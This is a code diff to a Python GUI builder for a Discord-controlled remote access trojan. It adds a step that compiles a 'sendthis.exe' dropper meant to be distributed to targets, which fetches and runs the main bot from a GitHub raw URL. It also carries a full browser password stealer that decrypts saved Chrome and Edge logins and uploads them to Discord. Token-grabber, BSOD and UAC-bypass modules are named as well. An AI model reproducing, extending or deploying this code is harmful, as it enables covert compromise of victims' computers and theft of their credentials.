@@ -2,12 +2,12 @@ import sys
 import os
 import shutil
 import subprocess
+import base64
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
                              QWidget, QCheckBox, QLineEdit, QLabel, QPushButton, 
-                             QGroupBox, QMessageBox, QFrame, QTextEdit)
+                             QGroupBox, QMessageBox, QFrame, QTextEdit,QInputDialog)
 from PyQt6.QtCore import Qt
 from PyQt6.QtGui import QFont, QPalette, QColor
-
 class RatBuilderGUI(QMainWindow):
     def __init__(self):
         super().__init__()
@@ -247,7 +247,77 @@ class RatBuilderGUI(QMainWindow):
                     stop: 0 #B8860B, stop: 1 #DAA520);
             }
         """
-            
+
+    def build_dropper_exe(self, token, github_raw_url, build_dir):
+        """Build the lightweight dropper EXE"""
+        self.output_text.append("🔄 Building lightweight dropper...")
+        
+        # Encode the bot token in Base64
+        encoded_token = base64.b64encode(token.encode('utf-8')).decode('utf-8')
+        self.output_text.append(f"🔐 Token encoded: {encoded_token[:20]}...")
+        
+        # Read dropper source
+        dropper_source_path = os.path.join('rat_builder', 'dropper_source.py')
+        if not os.path.exists(dropper_source_path):
+            raise FileNotFoundError(f"Dropper source not found: {dropper_source_path}")
+        
+        with open(dropper_source_path, 'r', encoding='utf-8') as f:
+            dropper_content = f.read()
+        
+        # Replace placeholders
+        dropper_content = dropper_content.replace(
+            'ENCODED_BOT_TOKEN = "YOUR_BASE64_ENCODED_TOKEN_HERE"',
+            f'ENCODED_BOT_TOKEN = "{encoded_token}"'
+        )
+        dropper_content = dropper_content.replace(
+            'GITHUB_RAW_URL = "YOUR_GITHUB_RAW_URL_HERE"',
+            f'GITHUB_RAW_URL = "{github_raw_url}"'
+        )
+        
+        # Write modified dropper
+        dropper_py_path = os.path.join(build_dir, "dropper.py")
+        with open(dropper_py_path, 'w', encoding='utf-8') as f:
+            f.write(dropper_content)
+        
+        # Build dropper EXE
+        pyinstaller_cmd = self.find_pyinstaller()
+        
+        if pyinstaller_cmd == sys.executable:
+            cmd = [
+                sys.executable, '-m', 'PyInstaller',
+                '--onefile',
+                '--name', 'sendthis',
+                '--distpath', build_dir,
+                dropper_py_path
+            ]
+        else:
+            cmd = [
+                pyinstaller_cmd,
+                '--onefile',
+                '--name', 'sendthis',
+                '--distpath', build_dir,
+                dropper_py_path
+            ]
+        
+        self.output_text.append("Building dropper EXE...")
+        result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
+        
+        if result.returncode != 0:
+            self.output_text.append(f"PyInstaller stdout: {result.stdout}")
+            self.output_text.append(f"PyInstaller stderr: {result.stderr}")
+            raise Exception(f"Dropper build failed: {result.stderr}")
+        
+        dropper_exe_path = os.path.join(build_dir, "sendthis.exe")
+        
+        # Clean up
+        spec_file = os.path.join(build_dir, "sendthis.spec")
+        if os.path.exists(spec_file):
+            os.remove(spec_file)
+        if os.path.exists(dropper_py_path):
+            os.remove(dropper_py_path)
+        
+        self.output_text.append("✅ Dropper built: sendthis.exe")
+        return dropper_exe_path
     def select_all_commands(self):
         for checkbox in self.commands.values():
             checkbox.setChecked(True)
@@ -288,29 +358,63 @@ class RatBuilderGUI(QMainWindow):
                 os.makedirs(build_dir)
                 self.output_text.append(f"Created build directory: {build_dir}")
             
-            # Generate the bot file in build directory
+            # Step 1: Generate the main bot Python file
+            self.output_text.append("📝 Step 1: Building main bot source...")
             python_file = self.generate_bot_file(token, category_id, selected_commands, output_filename, build_dir)
             
-            # Build EXE with PyInstaller
-            exe_file = self.build_with_pyinstaller(python_file, output_filename, build_dir)
-            
-            self.output_text.append("Build completed successfully!")
-            self.output_text.append(f"Final output: {os.path.basename(exe_file)}")
-            self.output_text.append(f"Location: {os.path.abspath(build_dir)}")
+            # Step 2: Show instructions for uploading to GitHub
+            self.output_text.append("📤 STEP 2: UPLOAD TO GITHUB")
+            self.output_text.append("=" * 50)
+            self.output_text.append("1. Upload the main bot Python file to GitHub")
+            self.output_text.append("2. Get the RAW file URL (right-click 'Raw' button -> Copy link)")
+            self.output_text.append("3. The URL should look like:")
+            self.output_text.append("   https://raw.githubusercontent.com/username/repo/main/filename.py")
+            self.output_text.append("")
+            self.output_text.append("Paste the GitHub RAW URL below:")
+            self.output_text.append("")
+
+            # Get GitHub URL from user
+            github_url, ok = QInputDialog.getText(self, 'GitHub RAW URL', 
+                                                'Paste the GitHub RAW URL:')
+            if not ok or not github_url.strip():
+                QMessageBox.warning(self, 'Error', 'GitHub RAW URL is required!')
+                return
+
+            # Step 3: Build the dropper EXE
+            self.output_text.append("🛠️ Step 3: Building lightweight dropper...")
+            dropper_exe = self.build_dropper_exe(token, github_url.strip(), build_dir)
+            self.output_text.append("")
+            self.output_text.append("🎉 BUILD COMPLETED SUCCESSFULLY!")
+            self.output_text.append("=" * 50)
+            self.output_text.append(f"📄 Main bot source: {os.path.basename(python_file)}")
+            self.output_text.append(f"🚀 Dropper EXE: {os.path.basename(dropper_exe)}")
+            self.output_text.append("")
+            self.output_text.append("📋 DEPLOYMENT INSTRUCTIONS:")
+            self.output_text.append("1. Upload the main bot Python file to GitHub")
+            self.output_text.append("2. Keep the GitHub file accessible")
+            self.output_text.append("3. Distribute sendthis.exe to targets")
+            self.output_text.append("4. sendthis.exe will automatically:")
+            self.output_text.append("   - Install Python 3.10.5 if needed")
+            self.output_text.append("   - Download the main bot from GitHub")
+            self.output_text.append("   - Install required packages")
+            self.output_text.append("   - Run the bot automatically")
             
             # Open the build folder
             self.open_build_folder(build_dir)
             
             QMessageBox.information(self, 'Success', 
-                f'Bot built successfully!\n\n'
-                f'Final output: {os.path.basename(exe_file)}\n'
-                f'Location: {os.path.abspath(build_dir)}\n\n'
-                f'The build folder has been opened.')
+                f'Build completed successfully!\n\n'
+                f'Main bot source: {os.path.basename(python_file)}\n'
+                f'Dropper EXE: sendthis.exe\n\n'
+                f'Instructions:\n'
+                f'1. Keep main bot uploaded to GitHub\n'
+                f'2. Distribute sendthis.exe\n'
+                f'3. Dropper handles everything automatically')
             
         except Exception as e:
             self.output_text.append(f"Error: {str(e)}")
             QMessageBox.critical(self, 'Error', f'Failed to build bot: {str(e)}')
-    
+            
     def generate_bot_file(self, token, category_id, selected_commands, output_filename, build_dir):
         self.output_text.append("Reading source template...")
         
@@ -321,6 +425,20 @@ class RatBuilderGUI(QMainWindow):
         
         with open(source_path, 'r', encoding='utf-8') as f:
             template_content = f.read()
+        
+        # Encode the token for the main bot
+        encoded_token = base64.b64encode(token.encode('utf-8')).decode('utf-8')
+        self.output_text.append(f"🔐 Main bot token encoded: {encoded_token[:20]}...")
+        
+        # Replace placeholders in main bot
+        template_content = template_content.replace(
+            'ENCODED_TOKEN = "YOUR_BASE64_ENCODED_TOKEN_HERE"',
+            f'ENCODED_TOKEN = "{encoded_token}"'
+        )
+        template_content = template_content.replace(
+            'category_id="replaceme --> in builder category id"',
+            f'category_id="{category_id}"'
+        )
         
         self.output_text.append("Generating command implementations...")
         
@@ -352,251 +470,238 @@ class RatBuilderGUI(QMainWindow):
                 # Special handling for pass_light to avoid indentation issues
                 if command_name == 'pass_light':
                     command_definitions.append(f"""
+    @bot.command()
+    @is_correct_user_channel()
+    async def {command_name}(ctx):
+        \"\"\"Light password grabber for Chrome and Edge\"\"\"
+        import os
+        import json
+        import base64
+        import sqlite3
+        import win32crypt
+        from Crypto.Cipher import AES
+        import shutil
+        import time
+        from datetime import datetime, timedelta
+        import zipfile
+        
+        async def upload_to_discord(data, ctx):
+            try:
+                # Save passwords to file
+                temp_dir = os.environ['TEMP']
+                passwords_file = os.path.join(temp_dir, 'passwords.txt')
+                zip_file = os.path.join(temp_dir, 'passwords.zip')
+                
+                with open(passwords_file, 'w', encoding='utf-8') as f:
+                    if data:
+                        for url, credentials in data.items():
+                            username, password = credentials
+                            f.write(f"URL: {{url}}\\n")
+                            f.write(f"Username: {{username}}\\n")
+                            f.write(f"Password: {{password}}\\n")
+                            f.write("-" * 50 + "\\n")
+                    else:
+                        f.write("No passwords found\\n")
+                
+                # Create zip file
+                with zipfile.ZipFile(zip_file, 'w') as zipf:
+                    zipf.write(passwords_file, 'passwords.txt')
+                
+                # Send the zip file
+                with open(zip_file, 'rb') as f:
+                    await ctx.send(file=discord.File(f, "passwords.zip"))
+                
+                # Clean up
+                if os.path.exists(passwords_file):
+                    os.remove(passwords_file)
+                if os.path.exists(zip_file):
+                    os.remove(zip_file)
+                    
+            except Exception as e:
+                await ctx.send(f"Upload error: {{str(e)}}")
+        
+        def get_master_key():
+            try:
+                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
+                    local_state = f.read()
+                    local_state = json.loads(local_state)
+            except: 
+                return None
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        
+        def decrypt_password_edge(buff, master_key):
+            try:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)
+                decrypted_pass = decrypted_pass[:-16].decode()
+                return decrypted_pass
+            except Exception as e: 
+                return "Chrome < 80"
+        
+        def get_passwords_edge():
+            master_key = get_master_key()
+            if not master_key:
+                return {{}}
+                
+            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+            if not os.path.exists(login_db):
+                return {{}}
+                
+            try: 
+                shutil.copy2(login_db, "Loginvault.db")
+            except: 
+                return {{}}
+                
+            conn = sqlite3.connect("Loginvault.db")
+            cursor = conn.cursor()
 
-@bot.command()
-@is_correct_user_channel()
-async def {command_name}(ctx):
-    \"\"\"Light password grabber for Chrome and Edge\"\"\"
-    import os
-    import json
-    import base64
-    import sqlite3
-    import win32crypt
-    from Crypto.Cipher import AES
-    import shutil
-    import time
-    from datetime import datetime, timedelta
-    import zipfile
-    
-    async def upload_to_discord(data, ctx):
+            result = {{}}
+            try:
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for r in cursor.fetchall():
+                    url = r[0]
+                    username = r[1]
+                    encrypted_password = r[2]
+                    decrypted_password = decrypt_password_edge(encrypted_password, master_key)
+                    if username != "" or decrypted_password != "":
+                        result[url] = [username, decrypted_password]
+            except: 
+                pass
+
+            cursor.close()
+            conn.close()
+            try: 
+                os.remove("Loginvault.db")
+            except Exception as e: 
+                pass
+                
+            return result
+
+        def get_encryption_key():
+            try:
+                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = f.read()
+                    local_state = json.loads(local_state)
+
+                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+            except: 
+                return None
+
+        def decrypt_password_chrome(password, key):
+            try:
+                iv = password[3:15]
+                password = password[15:]
+                cipher = AES.new(key, AES.MODE_GCM, iv)
+                return cipher.decrypt(password)[:-16].decode()
+            except:
+                try: 
+                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+                except: 
+                    return ""
+
+        def get_chrome_passwords():
+            key = get_encryption_key()
+            if not key:
+                return {{}}
+                
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+            if not os.path.exists(db_path):
+                return {{}}
+                
+            file_name = "ChromeData.db"
+            shutil.copyfile(db_path, file_name)
+            db = sqlite3.connect(file_name)
+            cursor = db.cursor()
+            
+            result = {{}}
+            try:
+                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+                for row in cursor.fetchall():
+                    action_url = row[1]
+                    username = row[2]
+                    password = decrypt_password_chrome(row[3], key)
+                    if username or password:
+                        result[action_url] = [username, password]
+            except: 
+                pass
+                
+            cursor.close()
+            db.close()
+            try: 
+                os.remove(file_name)
+            except: 
+                pass
+                
+            return result
+
+        def grab_passwords():
+            result = {{}}
+            
+            # Get Chrome passwords
+            try: 
+                chrome_passwords = get_chrome_passwords()
+                result.update(chrome_passwords)
+            except: 
+                pass
+
+            # Get Edge passwords  
+            try: 
+                edge_passwords = get_passwords_edge()
+                result.update(edge_passwords)
+            except: 
+                pass
+            
+            return result
+
         try:
-            # Save passwords to file
-            temp_dir = os.environ['TEMP']
-            passwords_file = os.path.join(temp_dir, 'passwords.txt')
-            zip_file = os.path.join(temp_dir, 'passwords.zip')
+            await ctx.send("🔍 Starting password collection...")
             
-            with open(passwords_file, 'w', encoding='utf-8') as f:
-                if data:
-                    for url, credentials in data.items():
-                        username, password = credentials
-                        f.write(f"URL: {{url}}\\n")
-                        f.write(f"Username: {{username}}\\n")
-                        f.write(f"Password: {{password}}\\n")
-                        f.write("-" * 50 + "\\n")
-                else:
-                    f.write("No passwords found\\n")
+            passwords_data = grab_passwords()
             
-            # Create zip file
-            with zipfile.ZipFile(zip_file, 'w') as zipf:
-                zipf.write(passwords_file, 'passwords.txt')
-            
-            # Send the zip file
-            with open(zip_file, 'rb') as f:
-                await ctx.send(file=discord.File(f, "passwords.zip"))
-            
-            # Clean up
-            if os.path.exists(passwords_file):
-                os.remove(passwords_file)
-            if os.path.exists(zip_file):
-                os.remove(zip_file)
+            if passwords_data:
+                await upload_to_discord(passwords_data, ctx)
+                
+                # Send completion message
+                embed = discord.Embed(
+                    title="🔑 Password Grabber - Light",
+                    description=f"Successfully collected {{len(passwords_data)}} sets of credentials",
+                    colour=discord.Colour.green()
+                )
+                await ctx.send(embed=embed)
+            else:
+                embed = discord.Embed(
+                    title="🔑 Password Grabber - Light",
+                    description="No passwords found in Chrome or Edge browsers",
+                    colour=discord.Colour.orange()
+                )
+                await ctx.send(embed=embed)
                 
         except Exception as e:
-            await ctx.send(f"Upload error: {{str(e)}}")
-    
-    def get_master_key():
-        try:
-            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = json.loads(local_state)
-        except: 
-            return None
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-    
-    def decrypt_password_edge(buff, master_key):
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except Exception as e: 
-            return "Chrome < 80"
-    
-    def get_passwords_edge():
-        master_key = get_master_key()
-        if not master_key:
-            return {{}}
-            
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
-        if not os.path.exists(login_db):
-            return {{}}
-            
-        try: 
-            shutil.copy2(login_db, "Loginvault.db")
-        except: 
-            return {{}}
-            
-        conn = sqlite3.connect("Loginvault.db")
-        cursor = conn.cursor()
-
-        result = {{}}
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password_edge(encrypted_password, master_key)
-                if username != "" or decrypted_password != "":
-                    result[url] = [username, decrypted_password]
-        except: 
-            pass
-
-        cursor.close()
-        conn.close()
-        try: 
-            os.remove("Loginvault.db")
-        except Exception as e: 
-            pass
-            
-        return result
-
-    def get_encryption_key():
-        try:
-            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-            with open(local_state_path, "r", encoding="utf-8") as f:
-                local_state = f.read()
-                local_state = json.loads(local_state)
-
-            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-        except: 
-            return None
-
-    def decrypt_password_chrome(password, key):
-        try:
-            iv = password[3:15]
-            password = password[15:]
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            return cipher.decrypt(password)[:-16].decode()
-        except:
-            try: 
-                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-            except: 
-                return ""
-
-    def get_chrome_passwords():
-        key = get_encryption_key()
-        if not key:
-            return {{}}
-            
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
-        if not os.path.exists(db_path):
-            return {{}}
-            
-        file_name = "ChromeData.db"
-        shutil.copyfile(db_path, file_name)
-        db = sqlite3.connect(file_name)
-        cursor = db.cursor()
-        
-        result = {{}}
-        try:
-            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-            for row in cursor.fetchall():
-                action_url = row[1]
-                username = row[2]
-                password = decrypt_password_chrome(row[3], key)
-                if username or password:
-                    result[action_url] = [username, password]
-        except: 
-            pass
-            
-        cursor.close()
-        db.close()
-        try: 
-            os.remove(file_name)
-        except: 
-            pass
-            
-        return result
-
-    def grab_passwords():
-        result = {{}}
-        
-        # Get Chrome passwords
-        try: 
-            chrome_passwords = get_chrome_passwords()
-            result.update(chrome_passwords)
-        except: 
-            pass
-
-        # Get Edge passwords  
-        try: 
-            edge_passwords = get_passwords_edge()
-            result.update(edge_passwords)
-        except: 
-            pass
-        
-        return result
-
-    try:
-        await ctx.send("🔍 Starting password collection...")
-        
-        passwords_data = grab_passwords()
-        
-        if passwords_data:
-            await upload_to_discord(passwords_data, ctx)
-            
-            # Send completion message
             embed = discord.Embed(
-                title="🔑 Password Grabber - Light",
-                description=f"Successfully collected {{len(passwords_data)}} sets of credentials",
-                colour=discord.Colour.green()
+                title="❌ Password Grabber - Light",
+                description=f"Error: {{str(e)}}",
+                colour=discord.Colour.red()
             )
             await ctx.send(embed=embed)
-        else:
-            embed = discord.Embed(
-                title="🔑 Password Grabber - Light",
-                description="No passwords found in Chrome or Edge browsers",
-                colour=discord.Colour.orange()
-            )
-            await ctx.send(embed=embed)
-            
-    except Exception as e:
-        embed = discord.Embed(
-            title="❌ Password Grabber - Light",
-            description=f"Error: {{str(e)}}",
-            colour=discord.Colour.red()
-        )
-        await ctx.send(embed=embed)
     """)
                 else:
                     # Add command definition WITH the user channel check decorator for other commands
                     command_definitions.append(f"""
-
-@bot.command()
-@is_correct_user_channel()
-async def {command_name}(ctx):
-{self.indent_code(command_code)}
+    @bot.command()
+    @is_correct_user_channel()
+    async def {command_name}(ctx):
+    {self.indent_code(command_code)}
     """)
                 self.output_text.append(f"Added command: {command_name}")
             else:
                 self.output_text.append(f"Warning: Command file not found: {command_path}")
 
-        # Replace placeholders in template
-        template_content = template_content.replace(
-            'category_id="replaceme --> in builder category id"',
-            f'category_id="{category_id}"'
-        )
-
-        template_content = template_content.replace(
-            "bot.run('bot token here-->replace')",
-            f"bot.run('{token}')"
-        )
         # Remove placeholder command definitions (the ones at the bottom of the file)
-        # These are the placeholder commands that need to be removed
         placeholder_commands = [
             '@bot.command()\nasync def tkn_grab(ctx):#done\n    filename="discord_token_grabber.py"',
             '@bot.command()\nasync def bsod(ctx):#done\n    filename="bsod.py"',
@@ -626,21 +731,32 @@ async def {command_name}(ctx):
         template_content = template_content.replace('@bot.comnand()\nasync def uac(ctx):', '')
         template_content = template_content.replace('    filename="uac_bypass.py"', '')
         
-        # Insert command definitions before the bot.run line
+        # Insert command definitions before the final bot execution
         commands_section = '\n'.join(command_definitions)
         
-        # Find the position to insert commands (before bot.run)
-        run_line = f"bot.run('{token}')"
-        if run_line in template_content:
+        # Find the position to insert commands (before the final bot execution code)
+        # Look for the comment that marks where commands should be inserted
+        commands_marker = "# Commands are added by the builder above this line"
+        
+        if commands_marker in template_content:
             template_content = template_content.replace(
-                run_line, 
-                commands_section + '\n\n' + run_line
+                commands_marker, 
+                commands_section + '\n\n' + commands_marker
             )
         else:
-            # Fallback: append before last line
-            lines = template_content.split('\n')
-            lines.insert(-1, commands_section)
-            template_content = '\n'.join(lines)
+            # Fallback: insert before the final bot execution
+            final_execution_marker = "decoded_token = decode_token(ENCODED_TOKEN)"
+            if final_execution_marker in template_content:
+                template_content = template_content.replace(
+                    final_execution_marker,
+                    commands_section + '\n\n' + final_execution_marker
+                )
+            else:
+                # Last resort: append before last few lines
+                lines = template_content.split('\n')
+                insert_position = max(0, len(lines) - 10)  # Insert before last 10 lines
+                lines.insert(insert_position, commands_section)
+                template_content = '\n'.join(lines)
         
         # Write the final bot file to build directory
         python_filename = os.path.join(build_dir, f"{output_filename}.py")
